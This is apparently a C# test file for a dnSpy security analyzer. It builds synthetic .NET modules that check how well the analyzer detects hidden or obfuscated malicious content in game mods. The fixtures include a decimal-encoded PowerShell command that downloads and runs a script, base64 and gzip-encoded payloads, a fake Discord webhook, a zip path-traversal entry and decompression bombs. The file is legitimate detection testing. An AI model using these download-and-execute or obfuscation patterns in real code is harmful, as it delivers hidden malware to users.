using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using dnSpy.SecurityAnalysis;

// All sample-like methods below are synthetic dnlib IL objects, never CLR methods.
static class HiddenContentTests {
	static void Check(bool condition, string message) { if (!condition) throw new InvalidOperationException(message); }
	static SecurityResult Analyze(ModuleDef module) => new SecurityCoordinator(new ISecurityAnalyzer[] { new ConfigurationAnalyzer(), new HiddenContentAnalyzer(), new TargetedBehaviorAnalyzer() }).Analyze(module, CancellationToken.None);
	static TypeDef Type(ModuleDef module, string name) { var type = new TypeDefUser("Synthetic", name, module.CorLibTypes.Object.TypeDefOrRef); module.Types.Add(type); return type; }
	static MethodDef Method(TypeDef type, string name, params Instruction[] instructions) {
		var method = new MethodDefUser(name, MethodSig.CreateStatic(type.Module.CorLibTypes.Void), MethodImplAttributes.IL, MethodAttributes.Static | MethodAttributes.Public) { Body = new CilBody() };
		if (name == ".cctor") method.Attributes |= MethodAttributes.SpecialName | MethodAttributes.RTSpecialName;
		foreach (var instruction in instructions) method.Body.Instructions.Add(instruction);
		method.Body.UpdateInstructionOffsets(); type.Methods.Add(method); return method;
	}
	static MemberRef Api(ModuleDef module, string ns, string type, string name) => new MemberRefUser(module, name, MethodSig.CreateStatic(module.CorLibTypes.Void), new TypeRefUser(module, ns, type, module.CorLibTypes.AssemblyRef));
	static string Decimal(string value) => string.Join("-", value.Select(c => ((int)c).ToString()));
	static void Resource(ModuleDef module, string name, byte[] bytes) => module.Resources.Add(new EmbeddedResource(name, bytes, ManifestResourceAttributes.Private));
	public static void Run() {
		using var hidden = new ModuleDefUser("CleanLookingMod");
		var dispatch = Type(hidden, "Dispatch");
		var invoke = Method(dispatch, "DispatchMetadata", Instruction.Create(OpCodes.Call, Api(hidden, "System.Reflection", "MethodBase", "Invoke")), Instruction.Create(OpCodes.Ret));
		var gameplay = Type(hidden, "Gameplay");
		var command = "cmd.exe /c powershell -Command Invoke-WebRequest https://example.org/test.cmd -OutFile demo.cmd; Start-Process demo.cmd";
		var configure = Method(gameplay, "Configure", Instruction.Create(OpCodes.Ldstr, Decimal("System.Diagnostics.Process") + "`" + Decimal(command)), Instruction.Create(OpCodes.Pop), Instruction.Create(OpCodes.Call, invoke), Instruction.Create(OpCodes.Ret));
		Method(gameplay, ".cctor", Instruction.Create(OpCodes.Call, configure), Instruction.Create(OpCodes.Ret));
		var result = Analyze(hidden);
		Check(result.HiddenContents.Any(c => c.Preview.Contains("System.Diagnostics.Process", StringComparison.Ordinal)), "Decimal identifier table was not recovered.");
		var chain = result.Findings.Single(f => f.RuleId == "MOD004");
		Check(chain.EvidenceItems.Any(e => e.Description.StartsWith("Startup", StringComparison.Ordinal)), "Startup path missing from encoded reflective chain.");
		Check(result.Iocs.Any(i => i.Value == "https://example.org/test.cmd"), "Decoded endpoint missing.");
		Check(result.HiddenContents.Where(c => c.Transformation.Contains("Decimal", StringComparison.Ordinal)).All(c => c.Confidence != SecurityConfidence.Confirmed), "Candidate decoding overstated certainty.");

		using var resourceModule = new ModuleDefUser("Resources");
		Resource(resourceModule, "script", Encoding.UTF8.GetBytes("set \"piece=powershell\"\n%piece% -Command Invoke-WebRequest https://example.org/data\n"));
		Resource(resourceModule, "wide", Encoding.UTF8.GetBytes("powershell -EncodedCommand " + Convert.ToBase64String(Encoding.Unicode.GetBytes("Invoke-WebRequest https://example.org/wide"))));
		Resource(resourceModule, "compressed", Encoding.UTF8.GetBytes(Convert.ToBase64String(Gzip(Encoding.UTF8.GetBytes("{\"url\":\"https://example.org/compressed\"}")))));
		Resource(resourceModule, "secret", Encoding.UTF8.GetBytes(Convert.ToBase64String(Encoding.UTF8.GetBytes("https://discord.com/api/webhooks/123456789012345678/DO_NOT_LEAK_TEST_TOKEN"))));
		var marker = Path.Combine(Path.GetTempPath(), "dnspy-no-extract-" + Guid.NewGuid().ToString("N") + ".txt");
		Resource(resourceModule, "traversal", Zip("../../" + Path.GetFileName(marker), Encoding.UTF8.GetBytes("https://example.org/zip")));
		Resource(resourceModule, "bomb", Gzip(new byte[AnalysisLimits.MaximumHiddenDecodedBytes + 1]));
		Resource(resourceModule, "expansion-bomb", Encoding.UTF8.GetBytes("set v=" + new string('A', 16384) + "\n" + string.Concat(Enumerable.Repeat("%v%", 100)) + " powershell\n"));
		Resource(resourceModule, "after-bomb", Encoding.UTF8.GetBytes("https://example.org/after"));
		var resourceResult = Analyze(resourceModule);
		Check(resourceResult.HiddenContents.Any(c => c.Transformation == "Batch substitution candidate" && c.Preview.Contains("powershell -Command", StringComparison.Ordinal)), "Literal batch substitution missing.");
		foreach (var endpoint in new[] { "wide", "compressed", "zip", "after" }) Check(resourceResult.Iocs.Any(i => i.Value == "https://example.org/" + endpoint), "Missing decoded endpoint: " + endpoint);
		Check(!File.Exists(marker), "An archive entry was extracted automatically.");
		Check(resourceResult.AnalysisErrors.Any(e => e.Contains("bomb", StringComparison.Ordinal)), "Decompression bomb was not reported.");
		Check(resourceResult.AnalysisErrors.Any(e => e.Contains("expansion-bomb", StringComparison.Ordinal)), "Batch expansion bomb was not reported.");
		var json = SecurityReportWriter.Write(resourceResult, 2);
		Check(!json.Contains("DO_NOT_LEAK_TEST_TOKEN", StringComparison.Ordinal), "Decoded webhook token leaked.");
		using var report = JsonDocument.Parse(json); Check(report.RootElement.GetProperty("hiddenContents").GetArrayLength() > 0, "Hidden content missing from JSON export.");
		Check(resourceResult.Findings.All(f => f.Severity != SecuritySeverity.High), "Resource presence alone became a high behavior chain.");

		using var unrelated = new ModuleDefUser("UnrelatedCapabilities");
		var shared = Method(Type(unrelated, "Logger"), "Log", Instruction.Create(OpCodes.Ret));
		Method(Type(unrelated, "Updates"), "Check", Instruction.Create(OpCodes.Ldstr, "https://example.org/update"), Instruction.Create(OpCodes.Pop), Instruction.Create(OpCodes.Call, Api(unrelated, "System.Net", "WebClient", "DownloadFile")), Instruction.Create(OpCodes.Call, shared), Instruction.Create(OpCodes.Ret));
		Method(Type(unrelated, "Game"), "Launch", Instruction.Create(OpCodes.Call, Api(unrelated, "System.Diagnostics", "Process", "Start")), Instruction.Create(OpCodes.Call, shared), Instruction.Create(OpCodes.Ret));
		Check(Analyze(unrelated).Findings.All(f => !f.RuleId.StartsWith("MOD", StringComparison.Ordinal)), "Unrelated methods joined through a shared helper.");

		using var metadata = new ModuleDefUser("ConfiguredUrl"); var assembly = new AssemblyDefUser("ConfiguredUrl"); assembly.Modules.Add(metadata);
		var attrType = new TypeRefUser(metadata, "System.Reflection", "AssemblyMetadataAttribute", metadata.CorLibTypes.AssemblyRef);
		var attribute = new CustomAttribute(new MemberRefUser(metadata, ".ctor", MethodSig.CreateInstance(metadata.CorLibTypes.Void, metadata.CorLibTypes.String, metadata.CorLibTypes.String), attrType));
		attribute.ConstructorArguments.Add(new CAArgument(metadata.CorLibTypes.String, new UTF8String("DownloadUrl")));
		attribute.ConstructorArguments.Add(new CAArgument(metadata.CorLibTypes.String, new UTF8String("https://example.org/configured"))); assembly.CustomAttributes.Add(attribute);
		var config = Type(metadata, "Configuration");
		var lookup = Method(config, "GetMetadata", Instruction.Create(OpCodes.Ret));
		var getter = Method(config, "ReadUrl", Instruction.Create(OpCodes.Ldstr, "DownloadUrl"), Instruction.Create(OpCodes.Ldstr, "https://example.org/fallback"), Instruction.Create(OpCodes.Call, lookup), Instruction.Create(OpCodes.Ret));
		Method(Type(metadata, "Installer"), "Setup", Instruction.Create(OpCodes.Call, getter), Instruction.Create(OpCodes.Call, Api(metadata, "System.Net", "WebClient", "DownloadFileTaskAsync")), Instruction.Create(OpCodes.Call, Api(metadata, "System.Diagnostics", "Process", "Start")), Instruction.Create(OpCodes.Ret));
		var metadataChain = Analyze(metadata).Findings.Single(f => f.RuleId == "MOD001");
		Check(metadataChain.EvidenceItems.Any(e => e.Description == "Assembly metadata override" && e.Value.Contains("configured", StringComparison.Ordinal)), "Configured URL was lost behind a fallback.");

		var analyzer = new HiddenContentAnalyzer();
		using var first = new ModuleDefUser("First"); using var second = new ModuleDefUser("Second");
		Resource(first, "first", Encoding.UTF8.GetBytes("https://example.org/first")); Resource(second, "second", Encoding.UTF8.GetBytes("https://example.org/second"));
		var firstResult = new SecurityResult(); var secondResult = new SecurityResult();
		Task.WaitAll(Task.Run(() => analyzer.Analyze(new SecurityContext(first, "", CancellationToken.None), firstResult)), Task.Run(() => analyzer.Analyze(new SecurityContext(second, "", CancellationToken.None), secondResult)));
		Check(firstResult.Iocs.Any(i => i.Value.EndsWith("/first", StringComparison.Ordinal)) && firstResult.Iocs.All(i => !i.Value.EndsWith("/second", StringComparison.Ordinal)), "Concurrent analysis mixed source modules.");
		using var cancellation = new CancellationTokenSource(); cancellation.Cancel(); bool canceled = false;
		try { analyzer.Analyze(new SecurityContext(first, "", cancellation.Token), new SecurityResult()); } catch (OperationCanceledException) { canceled = true; }
		Check(canceled, "Hidden-content cancellation ignored.");
	}
	static byte[] Gzip(byte[] bytes) { using var output = new MemoryStream(); using (var compressor = new GZipStream(output, CompressionMode.Compress, true)) compressor.Write(bytes); return output.ToArray(); }
	static byte[] Zip(string name, byte[] bytes) { using var output = new MemoryStream(); using (var zip = new ZipArchive(output, ZipArchiveMode.Create, true)) using (var entry = zip.CreateEntry(name).Open()) entry.Write(bytes); return output.ToArray(); }
}
